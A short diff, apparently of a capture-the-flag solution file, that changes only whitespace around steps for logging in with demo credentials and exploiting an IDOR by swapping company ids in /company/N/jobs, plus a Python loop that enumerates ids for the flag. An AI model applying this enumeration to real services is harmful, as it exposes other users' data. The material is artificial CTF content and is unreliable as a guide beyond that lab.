@@ -23,7 +23,7 @@ tricks:
     payload: |
       POST /token
       Content-Type: application/x-www-form-urlencoded
-      
+
       username=demo&password=demo
 
   - name: "Step 3: Exploit IDOR"
@@ -33,7 +33,7 @@ tricks:
       # After login, instead of /company/1/jobs
       # Access /company/2/jobs to get admin company's jobs
       # Flag is in the job with title "secret"
-      
+
       GET /company/2/jobs
       Cookie: access_token=Bearer <token>
 
@@ -45,5 +45,3 @@ tricks:
           resp = session.get(f"{target}/company/{company_id}/jobs")
           if "secret" in resp.text or "flag" in resp.text:
               print(f"Found in company {company_id}")
-
-
